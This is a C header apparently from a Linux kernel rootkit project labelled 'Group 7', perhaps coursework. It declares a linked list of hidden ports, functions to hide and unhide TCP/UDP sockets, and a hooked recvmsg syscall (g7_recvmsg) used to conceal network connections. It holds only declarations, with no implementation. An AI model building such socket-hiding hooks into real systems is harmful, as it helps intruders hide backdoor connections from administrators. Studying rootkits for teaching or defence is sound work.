#ifndef _GROUP7_SOCKHIDE_H
#define _GROUP7_SOCKHIDE_H

typedef enum {
    tcp4,
    udp4,
    tcp6,
    udp6
} proto_t;

typedef unsigned short port_t;

typedef struct port_list *port_list_t_ptr;
typedef struct port_list {
    port_t port;
    proto_t proto;
    port_list_t_ptr prev;
    port_list_t_ptr next;
} port_list_t;

extern port_list_t hidden_ports;

void hide_sockets(void);
void unhide_sockets(void);

void hide_port(port_t, proto_t);
void unhide_port(port_t, proto_t);

asmlinkage ssize_t g7_recvmsg(struct pt_regs *);

bool list_contains_port(port_list_t_ptr, port_t, proto_t);
port_list_t_ptr find_port_in_list(port_list_t_ptr, port_t, proto_t);
port_list_t_ptr add_port_to_list(port_list_t_ptr, port_t, proto_t);
port_list_t_ptr remove_port_from_list(port_list_t_ptr, port_t, proto_t);

#endif //_GROUP7_SOCKHIDE_H
